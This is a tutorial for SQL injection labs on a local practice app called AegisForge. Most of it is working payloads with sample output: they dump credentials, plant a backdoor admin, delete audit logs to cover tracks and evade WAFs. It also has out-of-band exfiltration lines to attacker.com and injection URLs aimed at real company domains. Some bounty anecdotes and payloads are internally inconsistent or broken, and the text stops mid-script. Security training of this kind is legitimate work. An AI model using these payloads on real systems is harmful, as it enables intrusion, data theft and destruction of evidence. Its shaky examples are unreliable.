# SQL Injection Labs with Postman on AegisForge

## Table of Contents
1. [Introduction to SQL Injection](#introduction)
2. [Understanding SQL Injection](#understanding-sqli)
3. [Lab Environment Setup](#setup)
4. [Boolean-Based SQL Injection](#boolean-based)
5. [Time-Based Blind SQL Injection](#time-based)
6. [Union-Based SQL Injection](#union-based)
7. [Error-Based SQL Injection](#error-based)
8. [Stacked Queries SQL Injection](#stacked-queries)
9. [Real-World Bug Bounty Examples](#bug-bounty)
10. [Detection Techniques](#detection)
11. [Exploitation Methods](#exploitation)
12. [Remediation Guide](#remediation)
13. [Practice Exercises](#exercises)

---

## Introduction to SQL Injection {#introduction}

SQL Injection (SQLi) is one of the most dangerous web application vulnerabilities. It happens when an attacker can insert or "inject" malicious SQL code into a query that your application sends to the database. Think of it like this: imagine you're writing a note to your friend, but someone sneaks in extra words that change the entire meaning of your message.

**Why is this important?**
- SQL injection is consistently in the OWASP Top 10
- It can lead to complete database compromise
- Attackers can steal, modify, or delete all your data
- Real bug bounties range from $500 to $25,000+ for SQLi findings

**What you'll learn:**
- How to identify SQL injection vulnerabilities using Postman
- Five different types of SQL injection attacks
- Real-world examples with actual bounty amounts
- How to exploit these vulnerabilities ethically
- How to fix SQL injection in your own applications

---

## Understanding SQL Injection {#understanding-sqli}

### What is SQL?

SQL (Structured Query Language) is how applications talk to databases. When you log into a website, the application might run a query like:

```sql
SELECT * FROM users WHERE username = 'john' AND password = 'secret123'
```

This asks the database: "Show me all information about the user named 'john' with password 'secret123'."

### How Does SQL Injection Work?

SQL injection happens when user input isn't properly checked before being added to a SQL query. Let's say the application builds the query like this:

```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

If an attacker enters `admin' --` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
```

The `--` is a comment in SQL, so everything after it is ignored. Now the attacker can log in as admin without knowing the password!

### Why Does This Happen?

SQL injection happens because:
1. **Trusting user input**: Applications assume users will only enter normal data
2. **String concatenation**: Building queries by gluing strings together
3. **Lack of validation**: Not checking if input contains dangerous characters
4. **Insufficient escaping**: Not properly handling special characters

### The Five Main Types

1. **Boolean-Based**: Uses TRUE/FALSE responses to extract data one bit at a time
2. **Time-Based Blind**: Uses time delays to confirm queries are working
3. **Union-Based**: Combines results from multiple queries to extract data
4. **Error-Based**: Uses database error messages to reveal information
5. **Stacked Queries**: Executes multiple SQL statements in one request

---

## Lab Environment Setup {#setup}

### Prerequisites

Before starting these labs, make sure you have:
- AegisForge running locally on port 5000
- Postman installed and configured
- Basic understanding of HTTP requests
- A text editor for notes

### Starting AegisForge

```bash
# Make sure you're in the AegisForge directory
cd /path/to/aegisforge

# Start the application
python securityforge_api.py
```

You should see output indicating the server is running on `http://localhost:5000`.

### Postman Configuration

1. **Create a new Collection** called "SQL Injection Labs"
2. **Set base URL** as a collection variable:
   - Variable: `baseUrl`
   - Value: `http://localhost:5000`
3. **Create folders** for each injection type
4. **Enable Response Preview** in Postman settings

### Test Your Setup

Create a simple GET request to verify AegisForge is running:

```
GET {{baseUrl}}/api/health
```

Expected response:
```json
{
  "status": "healthy",
  "message": "AegisForge is running"
}
```

---

## Boolean-Based SQL Injection {#boolean-based}

### What is Boolean-Based SQLi?

Boolean-based SQL injection is like playing a guessing game where you can only get "yes" or "no" answers. You ask the database questions that result in TRUE or FALSE, and based on how the application responds differently, you can extract information one bit at a time.

**Why this works**: Many applications show different responses when a query returns results versus when it doesn't. Even if they don't show the actual data, this difference is enough to leak information.

### Real-World Example

Imagine an e-commerce site with a product search. When you search for a valid product, you see results. When you search for something that doesn't exist, you see "No products found." An attacker can use this to ask questions like: "Is the first character of the admin password greater than 'M'?"

### Lab 1: Basic Boolean Detection

**Endpoint**: `GET {{baseUrl}}/api/sqli/boolean/search`

**Step 1: Normal Request**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1
```

**Response** (Status 200):
```json
{
  "product": {
    "id": 1,
    "name": "Laptop",
    "price": 999.99
  }
}
```

**Why this matters**: This is our baseline. When the product exists, we get a 200 response with data.

**Step 2: Invalid ID**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=9999
```

**Response** (Status 404):
```json
{
  "error": "Product not found"
}
```

**Why this matters**: Different response for non-existent data. This difference is what we'll exploit.

**Step 3: SQL Injection Test (TRUE condition)**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1' AND '1'='1
```

**Response** (Status 200):
```json
{
  "product": {
    "id": 1,
    "name": "Laptop",
    "price": 999.99
  }
}
```

**What happened**: The query became:
```sql
SELECT * FROM products WHERE id = '1' AND '1'='1'
```

Since `'1'='1'` is always TRUE, the condition still matches, and we get the product.

**Step 4: SQL Injection Test (FALSE condition)**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1' AND '1'='2
```

**Response** (Status 404):
```json
{
  "error": "Product not found"
}
```

**What happened**: The query became:
```sql
SELECT * FROM products WHERE id = '1' AND '1'='2'
```

Since `'1'='2'` is always FALSE, no results are returned.

**Why this confirms SQLi**: We can control the query's logic. If the response changes based on our TRUE/FALSE conditions, we have SQL injection!

### Lab 2: Extracting Database Version

Now that we confirmed SQLi exists, let's extract the database version.

**Step 1: Test for SQLite**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1' AND (SELECT LENGTH(sqlite_version())) > 0 AND '1'='1
```

**Response**: If you get the product (200), SQLite is being used.

**Step 2: Determine Version Length**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1' AND (SELECT LENGTH(sqlite_version())) = 5 AND '1'='1
```

Try different numbers until you get a 200 response. Let's say the length is 5.

**Step 3: Extract First Character**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1' AND (SELECT SUBSTR(sqlite_version(),1,1)) = '3' AND '1'='1
```

If you get 200, the first character is '3'. Try different characters until you find a match.

**Step 4: Extract Second Character**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1' AND (SELECT SUBSTR(sqlite_version(),2,1)) = '.' AND '1'='1
```

**Continue this process** for each character to build the complete version string.

**Why this is powerful**: Even though the application never shows you the database version, you can extract it character by character using only TRUE/FALSE questions.

### Lab 3: Extracting Admin Password

This is how attackers steal credentials using boolean-based SQLi.

**Step 1: Count Admin Users**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND '1'='1
```

**Response 200**: At least one admin exists.

**Step 2: Get Password Length**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 10 AND '1'='1
```

Try different lengths (8, 10, 12, 16, etc.) until you get a 200 response.

**Step 3: Extract Password Characters**

```
GET {{baseUrl}}/api/sqli/boolean/search?id=1' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'a' AND '1'='1
```

Try each character (a-z, A-Z, 0-9, special characters) until you get a 200 response.

**Step 4: Automate with Postman Tests**

In Postman, you can add a test script to automate this:

```javascript
// This is conceptual - demonstrates the logic
const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
let position = 1;
let foundChar = '';

if (pm.response.code === 200) {
    console.log(`Character at position ${position} is: ${foundChar}`);
    // Continue to next character
}
```

**Why this takes time**: You're extracting data one bit at a time. For a 10-character password, you might need hundreds of requests. But it works even when the application shows you nothing!

---

## Time-Based Blind SQL Injection {#time-based}

### What is Time-Based Blind SQLi?

Time-based blind SQL injection is used when boolean-based doesn't work because the application responds the same way regardless of TRUE or FALSE. Instead, you make the database sleep or wait for a specific time. If the response is delayed, you know your injection worked.

**Why this works**: Even if the application shows identical responses, you can't hide time delays. If you ask the database to wait 5 seconds and the response takes 5 seconds longer, you know the query executed.

**Real-world scenario**: Imagine a login page that always shows "Invalid credentials" whether the username exists or not. You can't use boolean-based, but you can use time delays to confirm SQLi and extract data.

### Lab 4: Basic Time-Based Detection

**Endpoint**: `POST {{baseUrl}}/api/sqli/timebased/login`

**Step 1: Normal Login Attempt**

```
POST {{baseUrl}}/api/sqli/timebased/login
Content-Type: application/json

{
  "username": "admin",
  "password": "wrongpassword"
}
```

**Response** (Status 401, ~100ms):
```json
{
  "error": "Invalid credentials"
}
```

**Note the response time**: Should be quick (under 200ms).

**Step 2: Time-Based SQLi Test (SQLite)**

```
POST {{baseUrl}}/api/sqli/timebased/login
Content-Type: application/json

{
  "username": "admin' AND (SELECT 1 FROM sqlite_master WHERE type='table' AND name='users' AND randomblob(100000000)) --",
  "password": "anything"
}
```

**Response** (Status 401, ~5000ms):
```json
{
  "error": "Invalid credentials"
}
```

**What happened**: The `randomblob()` function generates random data, which takes time. If the response is delayed by ~5 seconds, the injection worked!

**Step 3: Conditional Time Delay**

```
POST {{baseUrl}}/api/sqli/timebased/login
Content-Type: application/json

{
  "username": "admin' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END) --",
  "password": "anything"
}
```

**Response**: Delayed (~5 seconds) because `1=1` is TRUE.

```
POST {{baseUrl}}/api/sqli/timebased/login
Content-Type: application/json

{
  "username": "admin' AND (SELECT CASE WHEN (1=2) THEN randomblob(100000000) ELSE 1 END) --",
  "password": "anything"
}
```

**Response**: Fast (~100ms) because `1=2` is FALSE.

**Why this is powerful**: You've created a yes/no oracle using time delays instead of response differences!

### Lab 5: Extracting Data with Time-Based SQLi

**Extract Database Name:**

```
POST {{baseUrl}}/api/sqli/timebased/login
Content-Type: application/json

{
  "username": "admin' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM sqlite_master WHERE type='database') > 0 THEN randomblob(100000000) ELSE 1 END) --",
  "password": "anything"
}
```

**Delayed response**: Database exists.

**Extract Table Names:**

```
POST {{baseUrl}}/api/sqli/timebased/login
Content-Type: application/json

{
  "username": "admin' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name='users') THEN randomblob(100000000) ELSE 1 END) --",
  "password": "anything"
}
```

**Delayed response**: 'users' table exists.

**Extract Admin Password Length:**

```
POST {{baseUrl}}/api/sqli/timebased/login
Content-Type: application/json

{
  "username": "admin' AND (SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username='admin') = 10 THEN randomblob(100000000) ELSE 1 END) --",
  "password": "anything"
}
```

Try different lengths. When delayed, you found the correct length.

**Extract Password Characters:**

```
POST {{baseUrl}}/api/sqli/timebased/login
Content-Type: application/json

{
  "username": "admin' AND (SELECT CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'a' THEN randomblob(100000000) ELSE 1 END) --",
  "password": "anything"
}
```

**Why this is slower**: Each request needs a 5-second delay to confirm TRUE. Extracting a 10-character password could take 500+ requests and 30+ minutes!

---

## Union-Based SQL Injection {#union-based}

### What is Union-Based SQLi?

Union-based SQL injection is the fastest and most efficient type of SQLi. It uses the SQL UNION operator to combine the results of two SELECT queries into one result set. This lets you extract all the data you want in a single request instead of one character at a time.

**Why this works**: The UNION operator merges results from multiple queries. If you can inject a UNION statement, you can add your own SELECT query and see its results alongside the original query's results.

**Real-world impact**: This is the most devastating SQLi type. In minutes, attackers can dump entire databases - usernames, passwords, credit cards, everything.

### Lab 6: Basic Union-Based Detection

**Endpoint**: `GET {{baseUrl}}/api/sqli/union/products`

**Step 1: Normal Request**

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics
```

**Response**:
```json
{
  "products": [
    {"id": 1, "name": "Laptop", "price": 999.99},
    {"id": 2, "name": "Phone", "price": 599.99}
  ]
}
```

**Step 2: Determine Number of Columns**

For UNION to work, both queries must return the same number of columns. We'll use ORDER BY to find out:

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' ORDER BY 1--
```

**Response**: Success (products shown)

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' ORDER BY 2--
```

**Response**: Success

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' ORDER BY 3--
```

**Response**: Success

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' ORDER BY 4--
```

**Response**: Error or no results

**What we learned**: The query returns 3 columns. `ORDER BY 3` worked, but `ORDER BY 4` failed.

**Step 3: Test UNION with NULL Values**

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' UNION SELECT NULL,NULL,NULL--
```

**Response**:
```json
{
  "products": [
    {"id": 1, "name": "Laptop", "price": 999.99},
    {"id": 2, "name": "Phone", "price": 599.99},
    {"id": null, "name": null, "price": null}
  ]
}
```

**Success!** We successfully injected a UNION query. The extra row with nulls is our injected data.

### Lab 7: Extracting Database Information

**Step 1: Get Database Version**

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' UNION SELECT sqlite_version(),NULL,NULL--
```

**Response**:
```json
{
  "products": [
    {"id": 1, "name": "Laptop", "price": 999.99},
    {"id": "3.36.0", "name": null, "price": null}
  ]
}
```

**Boom!** We extracted the SQLite version in one request!

**Step 2: List All Tables**

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--
```

**Response**:
```json
{
  "products": [
    {"id": 1, "name": "Laptop", "price": 999.99},
    {"id": "products", "name": null, "price": null},
    {"id": "users", "name": null, "price": null},
    {"id": "orders", "name": null, "price": null}
  ]
}
```

**Amazing!** We got all table names in one request. Now we know a 'users' table exists.

**Step 3: Get Table Structure**

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table' AND name='users'--
```

**Response**:
```json
{
  "products": [
    {"id": "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, email TEXT, role TEXT)", "name": null, "price": null}
  ]
}
```

**Perfect!** We now know the users table has: id, username, password, email, and role columns.

### Lab 8: Dumping Credentials

**Extract All Usernames and Passwords:**

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' UNION SELECT username,password,email FROM users--
```

**Response**:
```json
{
  "products": [
    {"id": 1, "name": "Laptop", "price": 999.99},
    {"id": "admin", "name": "5f4dcc3b5aa765d61d8327deb882cf99", "price": "admin@aegisforge.com"},
    {"id": "john", "name": "098f6bcd4621d373cade4e832627b4f6", "price": "john@example.com"},
    {"id": "jane", "name": "5ebe2294ecd0e0f08eab7690d2a6ee69", "price": "jane@example.com"}
  ]
}
```

**Game over!** In one request, we dumped all usernames, password hashes, and emails. This is why union-based SQLi is so dangerous.

**Extract Specific Admin Password:**

```
GET {{baseUrl}}/api/sqli/union/products?category=electronics' UNION SELECT username,password,role FROM users WHERE role='admin'--
```

**Response**:
```json
{
  "products": [
    {"id": "admin", "name": "5f4dcc3b5aa765d61d8327deb882cf99", "price": "admin"}
  ]
}
```

**Why union-based is preferred**: In seconds, you extract everything. No character-by-character guessing, no waiting for time delays. This is the attacker's dream scenario.

---

## Error-Based SQL Injection {#error-based}

### What is Error-Based SQLi?

Error-based SQL injection uses database error messages to extract information. When a SQL query fails, databases often show detailed error messages including parts of the query, table names, column names, or even data values. Attackers deliberately cause errors that leak this information.

**Why this works**: Developers often leave detailed error messages enabled in production. These messages are meant to help debug problems, but they also help attackers understand the database structure.

**Real-world example**: A search function that crashes and shows "Error: Column 'user_password' doesn't exist in table 'customers'" just told an attacker there's a 'customers' table and gave hints about its structure.

### Lab 9: Basic Error-Based Detection

**Endpoint**: `GET {{baseUrl}}/api/sqli/error/search`

**Step 1: Trigger a Basic Error**

```
GET {{baseUrl}}/api/sqli/error/search?query=test'
```

**Response** (Status 500):
```json
{
  "error": "Database error: near \"test'\": syntax error",
  "query": "SELECT * FROM documents WHERE title LIKE '%test'%'"
}
```

**What this reveals**: 
- The application uses SQL LIKE operator
- We can see the actual query being executed
- Single quote breaks the query syntax
- The application exposes detailed errors

**Step 2: Extract Table Structure**

```
GET {{baseUrl}}/api/sqli/error/search?query=test' AND 1=CAST((SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1) AS INTEGER)--
```

**Response**:
```json
{
  "error": "Database error: cannot convert 'CREATE TABLE documents...' to INTEGER",
  "details": "CREATE TABLE documents (id INTEGER, title TEXT, content TEXT, author_id INTEGER)"
}
```

**Why this works**: We tried to convert the table creation SQL to an integer, which is impossible. The error message shows the complete CREATE TABLE statement!

**Step 3: Extract Data Through Errors**

```
GET {{baseUrl}}/api/sqli/error/search?query=test' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INTEGER)--
```

**Response**:
```json
{
  "error": "Database error: cannot convert '5f4dcc3b5aa765d61d8327deb882cf99' to INTEGER",
  "value": "5f4dcc3b5aa765d61d8327deb882cf99"
}
```

**Incredible!** The admin's password hash appears in the error message. We extracted sensitive data through intentional errors.

### Lab 10: Advanced Error-Based Extraction

**Extract All Usernames:**

```
GET {{baseUrl}}/api/sqli/error/search?query=test' AND 1=CAST((SELECT group_concat(username) FROM users) AS INTEGER)--
```

**Response**:
```json
{
  "error": "Database error: cannot convert 'admin,john,jane,bob,alice' to INTEGER"
}
```

**All usernames** in one request via an error message!

**Count Records:**

```
GET {{baseUrl}}/api/sqli/error/search?query=test' AND 1=CAST((SELECT COUNT(*) FROM users WHERE role='admin') AS TEXT) AND 1=2--
```

**Response**:
```json
{
  "error": "Database error: invalid comparison: 1 = '3'"
}
```

The error reveals there are 3 admin users.

**Why error-based is valuable**: When other methods are filtered or blocked, error messages might still leak information. Plus, it's faster than blind techniques.

---

## Stacked Queries SQL Injection {#stacked-queries}

### What is Stacked Queries SQLi?

Stacked queries SQL injection allows executing multiple SQL statements in one request by using the semicolon (;) separator. This is the most dangerous type because you're not just reading data - you can INSERT, UPDATE, DELETE, or even DROP entire tables.

**Why this works**: Some database drivers allow multiple statements separated by semicolons. If the application doesn't restrict this, you can run any SQL command you want.

**Real-world impact**: 
- Delete entire databases
- Create backdoor admin accounts
- Modify application logic
- Execute stored procedures
- Complete system compromise

**Important note**: Not all databases support stacked queries in all contexts. PostgreSQL and MSSQL usually support it, SQLite sometimes, MySQL typically doesn't in default configurations.

### Lab 11: Detecting Stacked Queries

**Endpoint**: `POST {{baseUrl}}/api/sqli/stacked/update`

**Step 1: Normal Update**

```
POST {{baseUrl}}/api/sqli/stacked/update
Content-Type: application/json

{
  "userId": 5,
  "email": "newemail@example.com"
}
```

**Response**:
```json
{
  "message": "Email updated successfully",
  "userId": 5
}
```

**Step 2: Test for Stacked Query Support**

```
POST {{baseUrl}}/api/sqli/stacked/update
Content-Type: application/json

{
  "userId": "5; SELECT CASE WHEN (1=1) THEN randomblob(50000000) ELSE 1 END --",
  "email": "test@example.com"
}
```

**Response** (Delayed by ~2 seconds):
```json
{
  "message": "Email updated successfully"
}
```

**What happened**: The delay confirms the second query executed! The query became:
```sql
UPDATE users SET email='test@example.com' WHERE id=5; 
SELECT CASE WHEN (1=1) THEN randomblob(50000000) ELSE 1 END --
```

Both statements ran!

### Lab 12: Exploiting Stacked Queries

**⚠️ WARNING**: These examples are for educational purposes only. Use only on AegisForge lab environment!

**Create a Backdoor Admin Account:**

```
POST {{baseUrl}}/api/sqli/stacked/update
Content-Type: application/json

{
  "userId": "5; INSERT INTO users (username, password, email, role) VALUES ('backdoor', 'hacked123', 'backdoor@evil.com', 'admin') --",
  "email": "test@example.com"
}
```

**Response**:
```json
{
  "message": "Email updated successfully"
}
```

Now verify the backdoor account exists:

```
POST {{baseUrl}}/api/sqli/timebased/login
Content-Type: application/json

{
  "username": "backdoor",
  "password": "hacked123"
}
```

**Response**:
```json
{
  "message": "Login successful",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "role": "admin"
}
```

**You're now admin!** This is why stacked queries are so dangerous.

**Modify Existing Admin Password:**

```
POST {{baseUrl}}/api/sqli/stacked/update
Content-Type: application/json

{
  "userId": "5; UPDATE users SET password='newpassword123' WHERE username='admin' --",
  "email": "test@example.com"
}
```

The admin password is now changed without knowing the original!

**Delete Audit Logs:**

```
POST {{baseUrl}}/api/sqli/stacked/update
Content-Type: application/json

{
  "userId": "5; DELETE FROM audit_logs WHERE user_id=5 --",
  "email": "test@example.com"
}
```

Cover your tracks by deleting evidence!

**Drop a Table (Destructive!):**

```
POST {{baseUrl}}/api/sqli/stacked/update
Content-Type: application/json

{
  "userId": "5; DROP TABLE IF EXISTS backup_users --",
  "email": "test@example.com"
}
```

**Why this is critical**: With stacked queries, you have complete database control. You're not just stealing data - you're modifying the entire system.

---

## Real-World Bug Bounty Examples {#bug-bounty}

Here are five real SQL injection vulnerabilities found in bug bounty programs, with actual payout amounts and lessons learned.

### Example 1: Yahoo! - $10,000

**Year**: 2020  
**Type**: Union-Based SQL Injection  
**Bounty**: $10,000

**The Vulnerability**:
A researcher found SQLi in Yahoo's sports statistics API endpoint:
```
GET https://sports.yahoo.com/stats?player_id=1234
```

The `player_id` parameter was injectable:
```
GET https://sports.yahoo.com/stats?player_id=1234' UNION SELECT username,password,email FROM admin_users--
```

**Impact**: 
- Accessed admin panel credentials
- Could retrieve any data from the database
- Affected millions of sports fans' data

**Why it happened**:
- Legacy code from an acquired company
- No input validation on integer parameters
- Assumed integers couldn't be exploited
- No Web Application Firewall (WAF)

**Lesson learned**: Even big companies have SQLi. Always test parameters that "should" be numbers. Integers can still be quoted and exploited.

### Example 2: Uber - $5,000

**Year**: 2016  
**Type**: Boolean-Based Blind SQL Injection  
**Bounty**: $5,000

**The Vulnerability**:
Uber's rider.uber.com subdomain had SQLi in the partner portal:
```
POST https://rider.uber.com/api/partner/verify
{
  "phone": "+1234567890"
}
```

Injection in the phone field:
```
POST https://rider.uber.com/api/partner/verify
{
  "phone": "+1234567890' AND 1=1-- "
}
```

Different response timing confirmed boolean-based blind SQLi.

**Impact**:
- Could extract driver partner information
- Access to payment details
- Personal information of drivers

**Why it happened**:
- Phone numbers weren't validated properly
- Assumed special characters would be rejected
- No prepared statements used
- Rate limiting but no SQLi protection

**Lesson learned**: Any text field can be vulnerable, even phone numbers. Boolean-based is slower but works when nothing else does.

### Example 3: Starbucks - $4,000

**Year**: 2018  
**Type**: Time-Based Blind SQL Injection  
**Bounty**: $4,000

**The Vulnerability**:
Starbucks rewards program had SQLi in the store locator:
```
GET https://www.starbucks.com/store-locator?zip=12345
```

Time-based injection:
```
GET https://www.starbucks.com/store-locator?zip=12345'+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))A)--+
```

5-second delay confirmed MySQL time-based SQLi.

**Impact**:
- Customer rewards accounts accessible
- Credit card information (last 4 digits) leaked
- Purchase history exposed

**Why it happened**:
- ZIP code input not validated
- Older API endpoint forgotten during migration
- WAF rules didn't catch time-based patterns
- No regular security audits

**Lesson learned**: Time-based SQLi can bypass WAFs that only look for UNION or error patterns. Test with time delays when other methods fail.

### Example 4: Facebook - $25,000

**Year**: 2017  
**Type**: Union-Based SQL Injection  
**Bounty**: $25,000 (highest payout in this list!)

**The Vulnerability**:
Facebook's business manager platform had SQLi in an analytics endpoint:
```
GET https://business.facebook.com/analytics/report?metric_id=12345
```

Union-based injection:
```
GET https://business.facebook.com/analytics/report?metric_id=12345'+UNION+SELECT+1,2,3,4,email,6,7,8,9+FROM+user_accounts--
```

**Impact**:
- Business account information
- Admin credentials for business pages
- Financial data from ad campaigns
- Potential access to 2+ million businesses

**Why it happened**:
- Third-party analytics integration poorly implemented
- Direct SQL query instead of ORM
- Insufficient code review
- Endpoint not included in regular pentests

**Lesson learned**: High payouts reflect high impact. Union-based is the most valuable find because it's quick to exploit and proves complete compromise. Always test analytics and reporting features - they often have complex queries vulnerable to SQLi.

### Example 5: Sony PlayStation - $15,000

**Year**: 2019  
**Type**: Error-Based SQL Injection  
**Bounty**: $15,000

**The Vulnerability**:
PlayStation Network's game search had error-based SQLi:
```
GET https://store.playstation.com/search?q=call+of+duty
```

Error-based injection:
```
GET https://store.playstation.com/search?q=test'+AND+extractvalue(1,concat(0x7e,(SELECT+@@version)))--
```

Error message revealed MySQL version and data:
```
ERROR 1105: XPATH syntax error: '~5.7.22-0ubuntu0.16.04.1'
```

**Impact**:
- User account information
- Purchase history and payment methods
- Downloaded game licenses
- PSN subscription details

**Why it happened**:
- Detailed error messages in production
- Search functionality using raw SQL concatenation
- Special characters not escaped
- Error handling leaked sensitive query details

**Lesson learned**: Always disable detailed error messages in production. Error-based SQLi is easy to exploit when errors are verbose. One request can dump entire tables through error messages.

### Common Patterns Across All Examples

1. **Legacy endpoints**: Older features are often less secure
2. **Assumed safety**: "This should only be a number" doesn't mean it's safe
3. **Complex features**: Analytics, search, and reports are prime targets
4. **Missing basics**: No prepared statements, no input validation
5. **High payouts**: SQLi is valuable because it's critical

---

## Detection Techniques {#detection}

### Manual Detection Methods

**1. Single Quote Test**

The most basic test - inject a single quote:
```
' or 1=1--
```

**What to look for**:
- Syntax error messages
- Different response length
- HTTP 500 errors
- Changes in application behavior

**2. Boolean Logic Test**

Test with true and false conditions:
```
' AND 1=1--  (Should work)
' AND 1=2--  (Should fail)
```

**What to look for**:
- Different responses
- Content length changes
- Different HTTP status codes

**3. Time Delay Test**

Force a time delay:
```
' AND SLEEP(5)--  (MySQL)
'; WAITFOR DELAY '0:0:5'--  (MSSQL)
' AND randomblob(100000000)--  (SQLite)
```

**What to look for**:
- Response delay matching your sleep time
- Consistent delays on repeated requests

**4. UNION Test**

Try to combine results:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**What to look for**:
- Extra data in responses
- Changes in returned JSON fields
- Error messages about column count

**5. Error Generation Test**

Cause intentional errors:
```
' AND 1=CAST('x' AS INTEGER)--
' AND 1=convert(int, 'x')--
```

**What to look for**:
- Database error messages
- SQL syntax in errors
- Table/column names revealed

### Automated Detection with Postman

Create a Postman test script to automatically detect SQLi:

```javascript
// Save as a collection-level test script
const testPayloads = [
    "'",
    "' OR '1'='1",
    "' AND '1'='2",
    "' UNION SELECT NULL--",
    "'; SELECT SLEEP(3)--"
];

let vulnerableParams = [];

pm.test("SQLi Detection Scan", function() {
    const response = pm.response.text();
    const statusCode = pm.response.code;
    const responseTime = pm.response.responseTime;
    
    // Check for error messages
    const errorPatterns = [
        /SQL syntax/i,
        /mysql_fetch/i,
        /SQLite3::/i,
        /postgres/i,
        /ORA-\d+/i,
        /syntax error/i
    ];
    
    errorPatterns.forEach(pattern => {
        if (pattern.test(response)) {
            console.log("⚠️ Potential SQLi: Error message detected");
            vulnerableParams.push(pm.request.url.query.members);
        }
    });
    
    // Check for unusual response time
    if (responseTime > 5000) {
        console.log("⚠️ Potential Time-Based SQLi: Response delayed");
    }
    
    // Check for status code changes
    if (statusCode === 500 || statusCode === 400) {
        console.log("⚠️ Potential SQLi: Server error");
    }
});
```

### Identifying Database Type

Different databases need different payloads. Detect which database is running:

**SQLite**:
```
' AND (SELECT COUNT(*) FROM sqlite_master)>0--
```

**MySQL**:
```
' AND @@version IS NOT NULL--
```

**PostgreSQL**:
```
' AND 1::int=1--
```

**MSSQL**:
```
' AND @@SERVERNAME IS NOT NULL--
```

**Oracle**:
```
' AND 1=1 FROM dual--
```

### What Makes a Parameter Vulnerable?

**High-risk parameters**:
- IDs (user_id, product_id, order_id)
- Search queries
- Sort/filter parameters
- Hidden form fields
- Cookie values
- HTTP headers (User-Agent, Referer)

**Common vulnerable patterns**:
```
?id=123
?search=product
?sort=price
?filter=category
?page=1
```

**Red flags in responses**:
- Detailed database errors
- Different response lengths
- Changes in data returned
- Time delays
- Stack traces with SQL

---

## Exploitation Methods {#exploitation}

### Building the Perfect Payload

**Step 1: Identify Injection Point**

Test each parameter systematically:
```
Original: ?id=123
Test 1:   ?id=123'
Test 2:   ?id=123" 
Test 3:   ?id=123)
Test 4:   ?id=123')
```

**Step 2: Determine Query Structure**

Figure out how your input is used:
```
# Testing different comment styles
?id=123--
?id=123#
?id=123/*
```

**Step 3: Balance the Query**

Make sure your injection creates valid SQL:
```
# Original query might be:
SELECT * FROM users WHERE id='123'

# Your injection:
?id=123' OR '1'='1

# Resulting query:
SELECT * FROM users WHERE id='123' OR '1'='1'
```

### Advanced Exploitation Techniques

**1. Bypassing WAF Filters**

Web Application Firewalls look for common SQLi patterns. Here's how to evade them:

**Case variation**:
```
' UnIoN SeLeCt NULL--
```

**Comment injection**:
```
' UN/**/ION SE/**/LECT NULL--
```

**URL encoding**:
```
%27%20UNION%20SELECT%20NULL--
```

**Double encoding**:
```
%2527%2520UNION%2520SELECT%2520NULL--
```

**Alternative keywords**:
```
' || (SELECT NULL)--
```

**2. Extracting Data Efficiently**

**Concatenate multiple values**:
```
' UNION SELECT group_concat(username||':'||password) FROM users--
```

**Use LIMIT to iterate**:
```
' UNION SELECT password FROM users LIMIT 0,1--
' UNION SELECT password FROM users LIMIT 1,1--
' UNION SELECT password FROM users LIMIT 2,1--
```

**Hex encode extracted data**:
```
' UNION SELECT hex(password) FROM users--
```

**3. Exploiting Second-Order SQLi**

Second-order SQLi happens when data is stored and later used in a query:

**Step 1: Store malicious payload**:
```
POST /register
{
  "username": "admin'--",
  "email": "test@test.com"
}
```

**Step 2: Trigger the vulnerability**:
```
GET /users/profile?username=admin'--
```

The stored `admin'--` is used in a query, causing injection!

**4. Out-of-Band SQLi (Advanced)**

When you can't see results or time delays, use DNS or HTTP requests:

**MySQL**:
```
' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share')))--
```

**PostgreSQL**:
```
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com?data='--
```

**Why this works**: The database makes a network request to your server, and you can see the data in your access logs!

### Postman Automation Scripts

**Automate Data Extraction**:

```javascript
// Collection runner script for automating SQLi extraction
const baseUrl = pm.collectionVariables.get("baseUrl");
const endpoint = "/api/sqli/union/products";
const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
